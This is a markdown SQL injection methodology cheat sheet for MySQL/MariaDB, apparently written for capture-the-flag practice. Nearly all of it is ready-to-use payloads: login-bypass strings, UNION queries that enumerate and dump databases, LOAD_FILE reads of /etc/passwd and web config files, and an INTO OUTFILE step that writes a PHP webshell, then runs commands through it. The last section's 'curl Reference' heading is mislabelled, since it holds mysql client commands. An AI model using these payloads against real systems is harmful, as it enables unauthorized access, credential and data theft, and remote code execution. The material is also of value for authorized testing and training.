# SQL Injection Methodology

**DB focus:** MySQL / MariaDB  
**Key tool:** mysql CLI, Burp Suite, manual UNION injection

---

## Phase 1 — Discovery

### Test for injection
Inject a single quote into every input field and observe response:
- `500 Internal Server Error` → SQL syntax error → injectable
- `302` with error message → query ran fine, wrong input
- No change → likely parameterized (confirm with SLEEP)

### Confirm with SLEEP (time-based check)
```bash
# If response takes 5+ seconds, injection is confirmed
# If response is fast (~0.4s), field is likely parameterized
' OR SLEEP(5)-- -
```

---

## Phase 2 — Auth Bypass (Login)

### Comment-based bypass (when username is known)
```sql
admin'-- -
admin')-- -    -- use if query has parentheses: WHERE (username='...')
```

### OR-based bypass
```sql
' OR '1'='1        -- no comment needed, uses original closing quote
' OR 1=1-- -
admin' OR '1'='1
```

**Operator precedence note:** AND evaluates before OR. If query is:
`WHERE username='X' OR '1'='1' AND password='Y'`  
The AND fires first (true AND false = false), then OR fires (X OR false).  
To bypass fully, inject OR into the password field too, or use comment to drop the AND.

### Parenthesis bypass
If query wraps conditions in parens: `WHERE (username='...' AND id > 1) AND password='...'`
```sql
admin')-- -       -- close the paren, comment out the rest
' OR id=5)-- -    -- log in as specific user ID
```

### Invitation code / hidden field bypass
If a registration or access form checks a code against a DB:
```sql
-- Keep valid-format prefix, inject after it, use closing quote pattern
aaaa-bbbb-1111' or '1'='1
```
The original query's closing quote closes the injected string — no comment needed.  
**Why this works:** `WHERE code='aaaa-bbbb-1111' or '1'='1'` is always true.

---

## Phase 3 — UNION Injection

### Step 1: Count columns with ORDER BY
```sql
' ORDER BY 1-- -   -- works → at least 1 column
' ORDER BY 2-- -   -- works → at least 2 columns
' ORDER BY 5-- -   -- error → table has 4 columns
```

### Step 2: Find visible columns
```sql
' UNION SELECT 1,2,3,4-- -
-- Look at page output — which numbers appear? Those columns are printed.
```

### Step 3: Enumerate DB
```sql
-- Current database
' UNION SELECT 1,2,database(),4-- -

-- All databases
' UNION SELECT 1,2,schema_name,4 FROM INFORMATION_SCHEMA.SCHEMATA-- -

-- Tables in a database
' UNION SELECT 1,2,TABLE_NAME,4 FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='dbname'-- -

-- Columns in a table
' UNION SELECT 1,2,COLUMN_NAME,4 FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='tablename'-- -

-- Dump data
' UNION SELECT 1,2,column1,4 FROM dbname.tablename-- -
' UNION SELECT 1,2,column1,4 FROM dbname.tablename WHERE col='value'-- -
```

---

## Phase 4 — File Read

### Check privileges first
```sql
-- Current user
' UNION SELECT 1,2,user(),4-- -

-- Super privilege
' UNION SELECT 1,2,super_priv,4 FROM mysql.user WHERE user="root"-- -

-- FILE privilege
' UNION SELECT 1,2,privilege_type,4 FROM information_schema.user_privileges WHERE grantee="'user'@'host'"-- -
```

### Check secure_file_priv
```sql
' UNION SELECT 1,2,variable_value,4 FROM information_schema.global_variables WHERE variable_name="secure_file_priv"-- -
-- Empty value = can read/write anywhere
-- NULL = cannot read/write
-- Path = restricted to that directory
```

### Read files
```sql
' UNION SELECT 1,2,LOAD_FILE("/etc/passwd"),4-- -
' UNION SELECT 1,2,LOAD_FILE("/var/www/html/config.php"),4-- -

-- Find web root via server config:
' UNION SELECT 1,2,LOAD_FILE("/etc/nginx/nginx.conf"),4-- -
' UNION SELECT 1,2,LOAD_FILE("/etc/nginx/sites-enabled/default"),4-- -
' UNION SELECT 1,2,LOAD_FILE("/etc/apache2/apache2.conf"),4-- -
```

---

## Phase 5 — File Write / RCE

### Write webshell
```sql
' UNION SELECT "","<?php system($_REQUEST[0]); ?>","","" INTO OUTFILE '/var/www/html/shell.php'-- -
```

### Execute commands
```
http://<TARGET>/shell.php?0=id
http://<TARGET>/shell.php?0=find / -name "flag_*" 2>/dev/null
http://<TARGET>/shell.php?0=cat /path/to/flag.txt
```

---

## MySQL Fingerprinting

| Payload | Expected output |
|---------|----------------|
| `SELECT @@version` | MySQL/MariaDB version string |
| `SELECT POW(1,1)` | `1` |
| `SELECT SLEEP(5)` | 5 second delay |

---

## curl Reference

```bash
# Connect to MySQL directly
mysql -u root -ppassword -h <TARGET> -P <PORT> --skip-ssl

# Common queries
mysql ... -e "show databases;"
mysql ... -e "SELECT * FROM db.table;"
mysql ... -e "SELECT COUNT(*) FROM (SELECT * FROM t1 UNION SELECT ...) AS x;"
```
